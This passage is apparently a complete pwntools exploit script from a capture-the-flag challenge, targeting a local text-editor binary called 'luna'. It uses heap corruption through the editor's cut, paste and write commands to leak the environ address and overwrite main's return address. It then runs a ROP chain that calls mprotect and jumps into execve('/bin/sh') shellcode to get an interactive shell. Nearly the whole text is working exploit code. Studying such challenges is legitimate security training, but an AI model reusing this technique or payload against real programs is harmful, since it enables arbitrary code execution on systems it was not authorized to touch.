    print('Strip  all debugging information')
    os.system('rm -f /tmp/gdb_symbols* /tmp/gdb_pid /tmp/gdb_script')
    exit(0)

for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]: 
    signal.signal(sig, clear)

# # Create a symbol file for GDB debugging
# try:
#     gdb_symbols = '''

#     '''

#     f = open('/tmp/gdb_symbols.c', 'w')
#     f.write(gdb_symbols)
#     f.close()
#     os.system('gcc -g -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
#     # os.system('gcc -g -m32 -shared /tmp/gdb_symbols.c -o /tmp/gdb_symbols.so')
# except Exception as e:
#     pass

context.arch = 'amd64'
# context.arch = 'i386'
# context.log_level = 'debug'
execve_file = './luna'
# sh = process(execve_file, env=`{`'LD_PRELOAD': '/tmp/gdb_symbols.so'`}`)
sh = process(execve_file)
# sh = remote('', 0)
elf = ELF(execve_file)
# libc = ELF('./libc-2.27.so')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Create temporary files for GDB debugging
try:
    gdbscript = '''
    def pr
        x/4gx 0x6D9340
        echo array:\n
        x/16x *(void **)0x6D9340
        end
    b *0x4011a2
    '''

    f = open('/tmp/gdb_pid', 'w')
    f.write(str(proc.pidof(sh)[0]))
    f.close()

    f = open('/tmp/gdb_script', 'w')
    f.write(gdbscript)
    f.close()
except Exception as e:
    pass

def new_tab():
    sh.sendlineafter('&gt;&gt;&gt; ', 'n')

def insert_tab(text):
    sh.sendlineafter('&gt;&gt;&gt; ', 'i')
    sh.sendline(str(0))
    sh.sendline(text)

def cut(num):
    sh.sendlineafter('&gt;&gt;&gt; ', 'c')
    sh.sendline(str(0) + ' ' + str(num))

def paste():
    sh.sendlineafter('&gt;&gt;&gt; ', 'p')
    sh.sendline(str(0))

def write(content):
    for i in range(len(content)):
        sh.sendlineafter('&gt;&gt;&gt; ', 'r')
        sh.sendline(str(i) + ' ' + str(i + 1))
        sh.sendline(content[i])

def select(index):
    sh.sendlineafter('&gt;&gt;&gt; ', 's')
    sh.sendline(str(index))

def display(start, end):
    sh.sendlineafter('&gt;&gt;&gt; ', 'd')
    sh.sendline(str(start) + ' ' + str(end))


insert_tab('a' * 0x18)
cut(0x18)

new_tab()
insert_tab('b' * 0xf8)
cut(0xf0)

new_tab()
paste()

write(p64(0x21) * 8 + p64(8) + p64(0) + p64(elf.symbols['environ']))
select(1)
display(0, 8)

environ_addr = u64(sh.recvn(8))
log.success('environ_addr: ' + hex(environ_addr))

select(2)
write(p64(0x21) * 8 + p64(0x100) + p64(0) + p64(environ_addr - 0x130 - 8)) # main return

select(1)
 # main return
write(p64(0x6d9360) + p64(0x0000000000400bcb)) # leave; ret

layout = [
    0,
    0x00000000004006a6, #: pop rdi; ret;
    0x6d9000,
    0x0000000000411583, #: pop rsi; ret; 
    0x2000,
    0x000000000044d836, #: pop rdx; ret; 
    7,
    elf.symbols['mprotect'],
    0x00000000004ae2a7, #: jmp rsp; 
]

shellcode = asm('''
mov rax, 0x0068732f6e69622f
push rax

mov rdi, rsp
xor rsi, rsi
mul rsi
mov al, 59
syscall
''')

new_tab()
insert_tab(flat(layout) + shellcode)

sh.sendlineafter('&gt;&gt;&gt; ', 'q')

sh.interactive()
clear()
```
